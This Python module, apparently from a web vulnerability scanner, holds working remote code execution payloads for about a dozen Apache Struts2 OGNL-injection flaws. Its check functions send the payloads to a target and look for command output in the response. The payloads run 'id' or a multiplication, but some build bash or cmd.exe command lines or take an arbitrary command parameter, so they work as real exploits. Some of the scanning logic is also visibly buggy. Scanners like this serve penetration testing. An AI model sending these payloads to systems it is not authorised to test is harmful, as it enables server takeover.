import copy
import logging
import os
import random
import re
import string
from urllib.parse import quote, urljoin, urlparse

from lib.connection.HttpEntity import Request
from lib.help.dump import vul, Rank


class Struts2:
    def echo_check(self, page):
        if match := self.pattern.search(page):
            logging.info("S2 detected id echo :" + match.group())
            return match.group()
        return False

    def __init__(self):
        self.pattern = re.compile("uid.*?gid.*?groups.*?")
        # form post
        self.s2_001 = '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"id"})).redirectErrorStream(' \
                      'true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),' \
                      '#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(' \
                      '"com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new ' \
                      'java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()} '
        # post  √
        self.s2_005 = "redirect:${#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq" \
                      "'+'uest'),#s=new java.util.Scanner((new java.lang.ProcessBuilder('id'.toString(" \
                      ").split('\\\\s'))).start().getInputStream()).useDelimiter('\\\\AAAA'),#str=#s.hasNext(" \
                      ")?#s.next():'',#resp=#context.get(" \
                      "'co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse')," \
                      "#resp.setCharacterEncoding('UTF-8'),#resp.getWriter().println(#str),#resp.getWriter().flush()," \
                      "#resp.getWriter().close()} "
        # form post
        self.s2_007 = '\' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,' \
                      '#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,' \
                      '@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(' \
                      '\'id\').getInputStream())) + \' '
        # get √
        self.s2_008 = {
            'debug': 'command',
            'expression': '(#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false"),'
                          '#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,'
                          '@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('
                          '"id").getInputStream()))'
        }
        # get | `a` tag
        self.s2_013 = '${# _memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec(' \
                      '\'id\').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),' \
                      '#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse(' \
                      ').getWriter(),#out.println(\'dbapp=\'+new java.lang.String(#d)),#out.close()} '
        # get  √
        self.s2_015 = "${#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.getClass(" \
                      ").getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess, " \
                      "true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(" \
                      "'id').getInputStream())}.action "
        # get  √
        self.s2_016 = 'redirect:${#context["xwork.MethodAccessor.denyMethodExecution"]=false,' \
                      '#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(' \
                      'true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec(' \
                      '"id").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),' \
                      '#d=new char[5000],#c.read(#d),#genxor=#context.get(' \
                      '"com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(#d),' \
                      '#genxor.flush(),#genxor.close()} '
        # get  √
        self.s2_032 = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS," \
                      "%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse()," \
                      "%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter()," \
                      "%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(" \
                      "%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D)," \
                      "%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str)," \
                      "%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=id "
        # content-type 54289  √
        self.s2_045 = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('test'," \
                      "233*233)}.multipart/form-data"
        # form post
        self.s2_053 = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((" \
                      "#container=#context['com.opensymphony.xwork2.ActionContext.container']).(" \
                      "#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(" \
                      "#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(" \
                      "#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty(" \
                      "'os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash'," \
                      "'-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(" \
                      "#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}\n"
        # location  √
        self.s2_057 = "${233*233}/actionChain1.action"
        self.method = {
            'POST': {"s2_001": self.s2_001, "s2_007": self.s2_007, "s2_053": self.s2_053},
            'GET': {"s2_013": self.s2_013}
        }

    def check_s2_005(self, url):
        r = Request("POST", url, data=quote(self.s2_005)).send().body
        if res := self.echo_check(r):
            logging.warning("[+] S2_005 vulnerable")
            return vul("RCE", "detail: https://vulhub.org/#/environments/struts2/s2-005/",
                       "id echo: " + res, Rank.CRITICAL)

    def check_s2_008(self, url):
        url = urljoin(url, "devmode.action")
        r = Request("GET", url, data=self.s2_008).send().body
        if res := self.echo_check(r):
            logging.warning("[+] S2_008 vulnerable")
            return vul("RCE", "detail: https://vulhub.org/#/environments/struts2/s2-008/",
                       "id echo: " + res, Rank.CRITICAL)

    def check_s2_015(self, url):
        url = urljoin(url, quote(self.s2_015) + '.action')
        r = Request("GET", url).send().body
        if res := self.echo_check(r):
            logging.warning("[+] S2_015 vulnerable")
            return vul("RCE", "detail: https://vulhub.org/#/environments/struts2/s2-015/",
                       "id echo: " + res, Rank.CRITICAL)

    def check_s2_016(self, url):
        r = Request("GET", url + '?' + quote(self.s2_016)).send().body
        if res := self.echo_check(r):
            logging.warning("[+] S2_016 vulnerable")
            return vul("RCE", "detail: https://vulhub.org/#/environments/struts2/s2-016/",
                       "id echo: " + res, Rank.CRITICAL)

    def check_s2_032(self, url):
        r = Request("GET", url + '?' + self.s2_032).send().body
        if res := self.echo_check(r):
            logging.warning("[+] S2_032 vulnerable")
            return vul("RCE", "detail: https://vulhub.org/#/environments/struts2/s2-032/",
                       "id echo: " + res, Rank.CRITICAL)

    def check_s2_045(self, url):
        r = Request("POST", url, headers={"Content-Type": self.s2_045}).send().headers
        if r.get('test') == '54289':
            logging.warning("[+] S2-045 vulnerable")
            return vul("RCE", "detail: https://vulhub.org/#/environments/struts2/s2-045/",
                       "calc result: 54289", Rank.CRITICAL)

    def check_s2_046(self, url):
        with open(os.path.abspath(__file__) + '/../scripts/s2-046', 'r') as f:
            url = urlparse(url)
            template = string.Template(''.join(f.readlines()))
            result = template.substitute(path=url.path, ip=url.hostname, port=url.port)
            globals_dict = {}
            exec(result, globals_dict)
            if res := globals_dict.get('response'):
                if 'test: 54289' in res:
                    logging.warning('[+] S2-046 vulnerable')
                    return vul("RCE", "detail: https://vulhub.org/#/environments/struts2/s2-046/",
                               "calc result: 54289", Rank.CRITICAL)

    def check_s2_057(self, url):
        r = Request("GET", urljoin(url, self.s2_057)).send().headers
        if location := r.get('Location'):
            if '54289' in location:
                logging.warning('[+] S2-057 vulnerable')
                return vul("RCE", "detail: https://vulhub.org/#/environments/struts2/s2-057/",
                           "calc result: 54289", Rank.CRITICAL)

    def check_s2_061(self, url):
        with open(os.path.abspath(__file__) + '/../scripts/s2-061', 'r') as f:
            url = urlparse(url)
            template = string.Template(''.join(f.readlines()))
            result = template.substitute(ip=url.hostname, port=url.port)
            globals_dict = {}
            exec(result, globals_dict)
            if res := self.echo_check(globals_dict.get('response')):
                logging.warning("[+] S2-061 vulnerable")
                return vul("RCE", "detail: https://vulhub.org/#/environments/struts2/s2-061/",
                           "id echo: " + res, Rank.CRITICAL)

    def s2_check(self, url, link_params):
        logging.info("[+] Start To Test Struts2")
        s2_vul = []
        methods = [(method[6:], getattr(self, method)) for method in dir(self) if
                   callable(getattr(self, method)) and method.startswith("check")]
        for meth in methods:
            if res := meth[1](url):
                return s2_vul.append(res)
        for item in link_params:
            _url = urljoin(url, item['link'])
            for k, v in self.method[item['method']]:
                params = item['qs']
                for m, n in params.items():
                    copied_params = copy.deepcopy(params)
                    target = params[m]
                    copied_params[m][random.randrange(len(target))] = v
                    r = Request(item['method'], _url, data=copied_params).send().body
                    if res := self.echo_check(r):
                        logging.warning("[+] " + k + " vulnerable")
                        s2_vul.append(vul("RCE", "detail: https://vulhub.org/#/environments/struts2/" + k.replace('_', '-'),
                                   "id echo: " + res, Rank.CRITICAL))
        return s2_vul
